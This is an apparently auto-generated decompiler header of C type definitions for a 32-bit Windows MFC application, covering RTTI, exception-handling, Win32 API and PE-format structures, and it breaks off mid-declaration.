typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined6;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    void *pVFTable;
    void *spare;
    char name[0];
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor *pType;
    ptrdiff_t dispCatchObj;
    void *addressOfHandler;
};

typedef struct _s__RTTIBaseClassDescriptor _s__RTTIBaseClassDescriptor, *P_s__RTTIBaseClassDescriptor;

typedef struct _s__RTTIBaseClassDescriptor RTTIBaseClassDescriptor;

typedef struct PMD PMD, *PPMD;

typedef struct _s__RTTIClassHierarchyDescriptor _s__RTTIClassHierarchyDescriptor, *P_s__RTTIClassHierarchyDescriptor;

typedef struct _s__RTTIClassHierarchyDescriptor RTTIClassHierarchyDescriptor;

struct PMD {
    ptrdiff_t mdisp;
    ptrdiff_t pdisp;
    ptrdiff_t vdisp;
};

struct _s__RTTIBaseClassDescriptor {
    struct TypeDescriptor *pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    dword numContainedBases; // count of extended classes in BaseClassArray (RTTI 2)
    struct PMD where; // member displacement structure
    dword attributes; // bit flags
    RTTIClassHierarchyDescriptor *pClassHierarchyDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3) for class
};

struct _s__RTTIClassHierarchyDescriptor {
    dword signature;
    dword attributes; // bit flags
    dword numBaseClasses; // number of base classes (i.e. rtti1Count)
    RTTIBaseClassDescriptor **pBaseClassArray; // ref to BaseClassArray (RTTI 2)
};

typedef struct AFX_MODULE_STATE AFX_MODULE_STATE, *PAFX_MODULE_STATE;

struct AFX_MODULE_STATE { // PlaceHolder Class Structure
};

typedef struct _AFX_THREAD_STATE _AFX_THREAD_STATE, *P_AFX_THREAD_STATE;

struct _AFX_THREAD_STATE { // PlaceHolder Class Structure
};

typedef struct CTestCmdUI CTestCmdUI, *PCTestCmdUI;

struct CTestCmdUI { // PlaceHolder Class Structure
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

typedef int __ehstate_t;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType *pHandlerArray;
};

typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Class Structure
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

typedef struct _s_ESTypeList _s_ESTypeList, *P_s_ESTypeList;

typedef struct _s_ESTypeList ESTypeList;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry *pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry *pTryBlockMap;
    uint nIPMapEntries;
    void *pIPToStateMap;
    ESTypeList *pESTypeList;
    int EHFlags;
};

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (*action)(void);
};

struct _s_ESTypeList {
    int nCount;
    HandlerType *pTypeArray;
};

typedef struct _s__RTTICompleteObjectLocator _s__RTTICompleteObjectLocator, *P_s__RTTICompleteObjectLocator;

struct _s__RTTICompleteObjectLocator {
    dword signature;
    dword offset; // offset of vbtable within class
    dword cdOffset; // constructor displacement offset
    struct TypeDescriptor *pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    RTTIClassHierarchyDescriptor *pClassDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3)
};

typedef struct CHandleMap CHandleMap, *PCHandleMap;

struct CHandleMap { // PlaceHolder Class Structure
};

typedef struct CMapPtrToPtr CMapPtrToPtr, *PCMapPtrToPtr;

struct CMapPtrToPtr { // PlaceHolder Class Structure
};

typedef struct AFX_MODULE_THREAD_STATE AFX_MODULE_THREAD_STATE, *PAFX_MODULE_THREAD_STATE;

struct AFX_MODULE_THREAD_STATE { // PlaceHolder Class Structure
};

typedef struct CMFCComObject<class_ATL::CAccessibleProxy> CMFCComObject<class_ATL::CAccessibleProxy>, *PCMFCComObject<class_ATL::CAccessibleProxy>;

struct CMFCComObject<class_ATL::CAccessibleProxy> { // PlaceHolder Class Structure
};

typedef struct CAfxStringMgr CAfxStringMgr, *PCAfxStringMgr;

struct CAfxStringMgr { // PlaceHolder Class Structure
};

typedef struct CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>, *PCArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>;

struct CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> { // PlaceHolder Class Structure
};

typedef struct CDllIsolationWrapperBase CDllIsolationWrapperBase, *PCDllIsolationWrapperBase;

struct CDllIsolationWrapperBase { // PlaceHolder Class Structure
};

typedef struct CObArray CObArray, *PCObArray;

struct CObArray { // PlaceHolder Class Structure
};

typedef struct CPtrArray CPtrArray, *PCPtrArray;

struct CPtrArray { // PlaceHolder Class Structure
};

typedef struct CCommDlgWrapper CCommDlgWrapper, *PCCommDlgWrapper;

struct CCommDlgWrapper { // PlaceHolder Class Structure
};

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef struct CMenu CMenu, *PCMenu;

struct CMenu { // PlaceHolder Class Structure
};

typedef struct CComCtlWrapper CComCtlWrapper, *PCComCtlWrapper;

struct CComCtlWrapper { // PlaceHolder Class Structure
};

typedef struct _s_FuncInfo FuncInfo;

typedef struct CCmdTarget CCmdTarget, *PCCmdTarget;

struct CCmdTarget { // PlaceHolder Class Structure
};

typedef struct CException CException, *PCException;

struct CException { // PlaceHolder Class Structure
};

typedef struct COleException COleException, *PCOleException;

struct COleException { // PlaceHolder Class Structure
};

typedef struct _s__RTTICompleteObjectLocator RTTICompleteObjectLocator;

typedef struct CShellWrapper CShellWrapper, *PCShellWrapper;

struct CShellWrapper { // PlaceHolder Class Structure
};

typedef ulonglong __uint64;

typedef struct _AFX_BASE_MODULE_STATE _AFX_BASE_MODULE_STATE, *P_AFX_BASE_MODULE_STATE;

struct _AFX_BASE_MODULE_STATE { // PlaceHolder Class Structure
};

typedef struct CByteArray CByteArray, *PCByteArray;

struct CByteArray { // PlaceHolder Class Structure
};

typedef struct CSimpleException CSimpleException, *PCSimpleException;

struct CSimpleException { // PlaceHolder Class Structure
};

typedef struct CCmdUI CCmdUI, *PCCmdUI;

struct CCmdUI { // PlaceHolder Class Structure
};

typedef struct _cpinfo _cpinfo, *P_cpinfo;

typedef uint UINT;

typedef uchar BYTE;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo *LPCPINFO;

typedef ulong DWORD;

typedef DWORD LCTYPE;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef ushort WORD;

typedef BYTE *LPBYTE;

typedef void *HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef struct _SYSTEMTIME SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef wchar_t WCHAR;

typedef WCHAR *LPWSTR;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW *LPSTARTUPINFOW;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef long LONG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (*PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT *PCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef void (*_PHNDLR)(int);

typedef DWORD ULONG;

typedef struct _strflt _strflt, *P_strflt;

struct _strflt {
    int sign;
    int decpt;
    int flag;
    char *mantissa;
};

typedef enum enum_3272 {
    INTRNCVT_OK=0,
    INTRNCVT_OVERFLOW=1,
    INTRNCVT_UNDERFLOW=2
} enum_3272;

typedef enum enum_3272 INTRNCVT_STATUS;

typedef struct _strflt *STRFLT;

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char *_ptr;
    int _cnt;
    char *_base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char *_tmpfname;
};

typedef struct _iobuf FILE;

typedef char *va_list;

typedef uint uintptr_t;

typedef struct lconv lconv, *Plconv;

struct lconv {
    char *decimal_point;
    char *thousands_sep;
    char *grouping;
    char *int_curr_symbol;
    char *currency_symbol;
    char *mon_decimal_point;
    char *mon_thousands_sep;
    char *mon_grouping;
    char *positive_sign;
    char *negative_sign;
    char int_frac_digits;
    char frac_digits;
    char p_cs_precedes;
    char p_sep_by_space;
    char n_cs_precedes;
    char n_sep_by_space;
    char p_sign_posn;
    char n_sign_posn;
    wchar_t *_W_decimal_point;
    wchar_t *_W_thousands_sep;
    wchar_t *_W_int_curr_symbol;
    wchar_t *_W_currency_symbol;
    wchar_t *_W_mon_decimal_point;
    wchar_t *_W_mon_thousands_sep;
    wchar_t *_W_positive_sign;
    wchar_t *_W_negative_sign;
};

typedef uint size_t;

typedef ushort wint_t;

typedef struct threadlocaleinfostruct threadlocaleinfostruct, *Pthreadlocaleinfostruct;

typedef struct threadlocaleinfostruct *pthreadlocinfo;

typedef struct localerefcount localerefcount, *Plocalerefcount;

typedef struct localerefcount locrefcount;

typedef struct __lc_time_data __lc_time_data, *P__lc_time_data;

struct localerefcount {
    char *locale;
    wchar_t *wlocale;
    int *refcount;
    int *wrefcount;
};

struct threadlocaleinfostruct {
    int refcount;
    uint lc_codepage;
    uint lc_collate_cp;
    uint lc_time_cp;
    locrefcount lc_category[6];
    int lc_clike;
    int mb_cur_max;
    int *lconv_intl_refcount;
    int *lconv_num_refcount;
    int *lconv_mon_refcount;
    struct lconv *lconv;
    int *ctype1_refcount;
    ushort *ctype1;
    ushort *pctype;
    uchar *pclmap;
    uchar *pcumap;
    struct __lc_time_data *lc_time_curr;
    wchar_t *locale_name[6];
};

struct __lc_time_data {
    char *wday_abbr[7];
    char *wday[7];
    char *month_abbr[12];
    char *month[12];
    char *ampm[2];
    char *ww_sdatefmt;
    char *ww_ldatefmt;
    char *ww_timefmt;
    int ww_caltype;
    int refcount;
    wchar_t *_W_wday_abbr[7];
    wchar_t *_W_wday[7];
    wchar_t *_W_month_abbr[12];
    wchar_t *_W_month[12];
    wchar_t *_W_ampm[2];
    wchar_t *_W_ww_sdatefmt;
    wchar_t *_W_ww_ldatefmt;
    wchar_t *_W_ww_timefmt;
    wchar_t *_W_ww_locale_name;
};

typedef int errno_t;

typedef struct localeinfo_struct localeinfo_struct, *Plocaleinfo_struct;

typedef struct threadmbcinfostruct threadmbcinfostruct, *Pthreadmbcinfostruct;

typedef struct threadmbcinfostruct *pthreadmbcinfo;

struct threadmbcinfostruct {
    int refcount;
    int mbcodepage;
    int ismbcodepage;
    ushort mbulinfo[6];
    uchar mbctype[257];
    uchar mbcasemap[256];
    wchar_t *mblocalename;
};

struct localeinfo_struct {
    pthreadlocinfo locinfo;
    pthreadmbcinfo mbcinfo;
};

typedef int intptr_t;

typedef struct localeinfo_struct *_locale_t;

typedef size_t rsize_t;

typedef ushort wctype_t;

typedef struct HDC__ HDC__, *PHDC__;

typedef struct HDC__ *HDC;

typedef long LONG_PTR;

typedef LONG_PTR LPARAM;

typedef BOOL (*GRAYSTRINGPROC)(HDC, LPARAM, int);

struct HDC__ {
    int unused;
};

typedef struct tagWINDOWPLACEMENT tagWINDOWPLACEMENT, *PtagWINDOWPLACEMENT;

typedef struct tagWINDOWPLACEMENT WINDOWPLACEMENT;

typedef struct tagPOINT tagPOINT, *PtagPOINT;

typedef struct tagPOINT POINT;

typedef struct tagRECT tagRECT, *PtagRECT;

typedef struct tagRECT RECT;

struct tagPOINT {
    LONG x;
    LONG y;
};

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

struct tagWINDOWPLACEMENT {
    UINT length;
    UINT flags;
    UINT showCmd;
    POINT ptMinPosition;
    POINT ptMaxPosition;
    RECT rcNormalPosition;
};

typedef struct tagWNDCLASSW tagWNDCLASSW, *PtagWNDCLASSW;

typedef struct tagWNDCLASSW *LPWNDCLASSW;

typedef LONG_PTR LRESULT;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef LRESULT (*WNDPROC)(HWND, UINT, WPARAM, LPARAM);

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

typedef struct HICON__ HICON__, *PHICON__;

typedef struct HICON__ *HICON;

typedef HICON HCURSOR;

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

typedef struct HBRUSH__ *HBRUSH;

typedef WCHAR *LPCWSTR;

struct HBRUSH__ {
    int unused;
};

struct HICON__ {
    int unused;
};

struct tagWNDCLASSW {
    UINT style;
    WNDPROC lpfnWndProc;
    int cbClsExtra;
    int cbWndExtra;
    HINSTANCE hInstance;
    HICON hIcon;
    HCURSOR hCursor;
    HBRUSH hbrBackground;
    LPCWSTR lpszMenuName;
    LPCWSTR lpszClassName;
};

struct HINSTANCE__ {
    int unused;
};

struct HWND__ {
    int unused;
};

typedef struct tagMSG tagMSG, *PtagMSG;

typedef struct tagMSG MSG;

struct tagMSG {
    HWND hwnd;
    UINT message;
    WPARAM wParam;
    LPARAM lParam;
    DWORD time;
    POINT pt;
};

typedef struct tagMSG *LPMSG;

typedef struct tagWNDCLASSEXW tagWNDCLASSEXW, *PtagWNDCLASSEXW;

typedef struct tagWNDCLASSEXW WNDCLASSEXW;

struct tagWNDCLASSEXW {
    UINT cbSize;
    UINT style;
    WNDPROC lpfnWndProc;
    int cbClsExtra;
    int cbWndExtra;
    HINSTANCE hInstance;
    HICON hIcon;
    HCURSOR hCursor;
    HBRUSH hbrBackground;
    LPCWSTR lpszMenuName;
    LPCWSTR lpszClassName;
    HICON hIconSm;
};

typedef LRESULT (*HOOKPROC)(int, WPARAM, LPARAM);

typedef struct tagPAINTSTRUCT tagPAINTSTRUCT, *PtagPAINTSTRUCT;

typedef struct tagPAINTSTRUCT *LPPAINTSTRUCT;

struct tagPAINTSTRUCT {
    HDC hdc;
    BOOL fErase;
    RECT rcPaint;
    BOOL fRestore;
    BOOL fIncUpdate;
    BYTE rgbReserved[32];
};

typedef struct tagDRAWTEXTPARAMS tagDRAWTEXTPARAMS, *PtagDRAWTEXTPARAMS;

struct tagDRAWTEXTPARAMS {
    UINT cbSize;
    int iTabLength;
    int iLeftMargin;
    int iRightMargin;
    UINT uiLengthDrawn;
};

typedef struct tagPAINTSTRUCT PAINTSTRUCT;

typedef struct tagWNDCLASSW WNDCLASSW;

typedef struct tagWNDCLASSEXW *LPWNDCLASSEXW;

typedef struct tagDRAWTEXTPARAMS *LPDRAWTEXTPARAMS;

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Class Structure
};

typedef struct bad_exception bad_exception, *Pbad_exception;

struct bad_exception { // PlaceHolder Class Structure
};


// WARNING! conflicting data type names: /guiddef.h/GUID - /GUID

typedef GUID IID;

typedef struct _GUID _GUID, *P_GUID;

struct _GUID {
    ulong Data1;
    ushort Data2;
    ushort Data3;
    uchar Data4[8];
};

typedef struct _devicemodeW _devicemodeW, *P_devicemodeW;

typedef union _union_660 _union_660, *P_union_660;

typedef union _union_663 _union_663, *P_union_663;

typedef struct _struct_661 _struct_661, *P_struct_661;

typedef struct _struct_662 _struct_662, *P_struct_662;

typedef struct _POINTL _POINTL, *P_POINTL;

typedef struct _POINTL POINTL;

struct _POINTL {
    LONG x;
    LONG y;
};

union _union_663 {
    DWORD dmDisplayFlags;
    DWORD dmNup;
};

struct _struct_662 {
    POINTL dmPosition;
    DWORD dmDisplayOrientation;
    DWORD dmDisplayFixedOutput;
};

struct _struct_661 {
    short dmOrientation;
    short dmPaperSize;
    short dmPaperLength;
    short dmPaperWidth;
    short dmScale;
    short dmCopies;
    short dmDefaultSource;
    short dmPrintQuality;
};

union _union_660 {
    struct _struct_661 field0;
    struct _struct_662 field1;
};

struct _devicemodeW {
    WCHAR dmDeviceName[32];
    WORD dmSpecVersion;
    WORD dmDriverVersion;
    WORD dmSize;
    WORD dmDriverExtra;
    DWORD dmFields;
    union _union_660 field6_0x4c;
    short dmColor;
    short dmDuplex;
    short dmYResolution;
    short dmTTOption;
    short dmCollate;
    WCHAR dmFormName[32];
    WORD dmLogPixels;
    DWORD dmBitsPerPel;
    DWORD dmPelsWidth;
    DWORD dmPelsHeight;
    union _union_663 field17_0xb4;
    DWORD dmDisplayFrequency;
    DWORD dmICMMethod;
    DWORD dmICMIntent;
    DWORD dmMediaType;
    DWORD dmDitherType;
    DWORD dmReserved1;
    DWORD dmReserved2;
    DWORD dmPanningWidth;
    DWORD dmPanningHeight;
};

typedef struct _devicemodeW *LPDEVMODEW;

typedef struct _devicemodeW *PDEVMODEW;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _IMAGE_SECTION_HEADER _IMAGE_SECTION_HEADER, *P_IMAGE_SECTION_HEADER;

typedef union _union_226 _union_226, *P_union_226;

union _union_226 {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
};

struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union _union_226 Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
};

typedef struct _IMAGE_SECTION_HEADER *PIMAGE_SECTION_HEADER;

typedef WCHAR *LPWCH;

typedef struct _OSVERSIONINFOW _OSVERSIONINFOW, *P_OSVERSIONINFOW;

typedef struct _OSVERSIONINFOW *LPOSVERSIONINFOW;

struct _OSVERSIONINFOW {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    WCHAR szCSDVersion[128];
};

typedef long HRESULT;

typedef CHAR *LPCSTR;

typedef LONG *PLONG;

typedef struct _OSVERSIONINFOA _OSVERSIONINFOA, *P_OSVERSIONINFOA;

struct _OSVERSIONINFOA {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    CHAR szCSDVersion[128];
};

typedef LARGE_INTEGER *PLARGE_INTEGER;

typedef struct _OSVERSIONINFOA *LPOSVERSIONINFOA;

typedef DWORD ACCESS_MASK;

typedef short SHORT;

typedef DWORD LCID;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR DWORD_PTR;

typedef ULONG_PTR SIZE_T;

typedef struct tagPOINT *LPPOINT;

typedef struct HBITMAP__ HBITMAP__, *PHBITMAP__;

struct HBITMAP__ {
    int unused;
};

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD *LPDWORD;

typedef struct HHOOK__ HHOOK__, *PHHOOK__;

struct HHOOK__ {
    int unused;
};

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef struct tagSIZE tagSIZE, *PtagSIZE;

struct tagSIZE {
    LONG cx;
    LONG cy;
};

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

struct HRSRC__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef int INT;

typedef HANDLE HLOCAL;

typedef struct tagSIZE *LPSIZE;

typedef struct HMENU__ HMENU__, *PHMENU__;

typedef struct HMENU__ *HMENU;

struct HMENU__ {
    int unused;
};

typedef struct _FILETIME *LPFILETIME;

typedef int (*FARPROC)(void);

typedef HANDLE *LPHANDLE;

typedef WORD *LPWORD;

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef WORD ATOM;

typedef struct tagRECT *LPRECT;

typedef HANDLE HGLOBAL;

typedef BOOL *LPBOOL;

typedef void *HGDIOBJ;

typedef BYTE *PBYTE;

typedef void *LPCVOID;

typedef struct HRSRC__ *HRSRC;

typedef struct HHOOK__ *HHOOK;

typedef DWORD COLORREF;

typedef struct HBITMAP__ *HBITMAP;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
